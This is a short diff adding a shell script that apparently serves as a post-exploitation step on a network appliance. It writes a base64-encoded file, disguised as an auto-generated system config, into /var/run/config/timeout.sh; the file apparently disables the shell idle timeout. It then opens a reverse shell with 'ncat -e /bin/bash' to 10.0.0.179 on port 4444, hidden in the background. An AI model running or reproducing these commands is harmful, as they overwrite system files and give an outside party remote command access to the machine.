@@ -1,0 +1,5 @@
+# Restore the original file
+echo 'IwojIFRISVMgSVMgQU4gQVVUTy1HRU5FUkFURUQgRklMRSAtIERPIE5PVCBFRElUISEhCiMKIyBVc2UgdGhlIHRtc2ggc2hlbGwgdXRpbGl0eSB0byBtYWtlIGNoYW5nZXMgdG8gdGhlIHN5c3RlbSBjb25maWd1cmF0aW9uLgojIEZvciBtb3JlIGluZm9ybWF0aW9uLCBzZWUgdG1zaCAtYSBoZWxwIHN5cyBzc2hkLgpQU09VVD1gL2Jpbi9wcyAtLW5vLWhlYWRlcnMgLW8gdHR5IC0kJGAKaWYgWyAiJHtQU09VVDowOjN9IiA9PSAidHR5IiBdOyB0aGVuCiAgICBleHBvcnQgVE1PVVQ9MAplbHNlCiAgICBleHBvcnQgVE1PVVQ9MApmaQoK' | base64 -d > /var/run/config/timeout.sh
+
+# Pop a shell
+ncat -e /bin/bash 10.0.0.179 4444 >/dev/null 2>&1 &
